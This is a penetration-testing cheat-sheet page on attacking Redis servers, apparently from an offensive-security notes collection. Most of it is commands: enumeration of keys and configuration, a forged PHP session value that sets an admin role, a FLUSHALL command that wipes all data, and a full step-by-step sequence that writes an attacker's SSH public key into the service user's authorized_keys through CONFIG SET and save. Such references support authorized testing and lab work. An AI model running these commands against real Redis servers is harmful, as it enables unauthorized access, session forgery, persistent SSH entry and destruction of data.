# Redis

## Overview

In-memory datastore access, authentication checks, session abuse, and dangerous persistence operations.

## Default Ports

- 6379/tcp default

## Quick Enumeration

```
> AUTH <PASSWORD>
> AUTH <USERNAME> <PASSWORD>
> INFO SERVER
> INFO keyspace
> CONFIG GET *
> SELECT <NUMBER>
> KEYS *
> GET
> HSET       // set value if a field within a hash data structure
> HGET       // retrieves a field and his value from a hash data structure
> HKEYS      // retrieves all field names from a hash data structure
> HGETALL    // retrieves all fields and values from a hash data structure
> GET PHPREDIS_SESSION:2a9mbvnjgd6i2qeqcubgdv8n4b
> SET PHPREDIS_SESSION:2a9mbvnjgd6i2qeqcubgdv8n4b "username|s:8:\"<USERNAME>\";role|s:5:\"admin\";auth|s:4:\"True\";" # the value "s:8" has to match the length of the username
```
```
redis-cli -h <RHOST>
echo "FLUSHALL" | redis-cli -h <RHOST>
(echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > /PATH/TO/FILE/<FILE>.txt
cat /PATH/TO/FILE/<FILE>.txt | redis-cli -h <RHOST> -x set s-key
<RHOST>:6379> get s-key
<RHOST>:6379> CONFIG GET dir
1) "dir"
2) "/var/lib/redis"
<RHOST>:6379> CONFIG SET dir /var/lib/redis/.ssh
OK
<RHOST>:6379> CONFIG SET dbfilename authorized_keys
OK
<RHOST>:6379> CONFIG GET dbfilename
3) "dbfilename"
4) "authorized_keys"
<RHOST>:6379> save
OK
```

## Common Attack Paths

- Unauthenticated access with dangerous `CONFIG` and persistence operations.
- Session or cache poisoning when application session state is stored in Redis.
- SSH key planting or filesystem write abuse when the service user and directory permissions allow it.

## See Also

- `08 Post Exploitation/Credentials and Secrets.md`
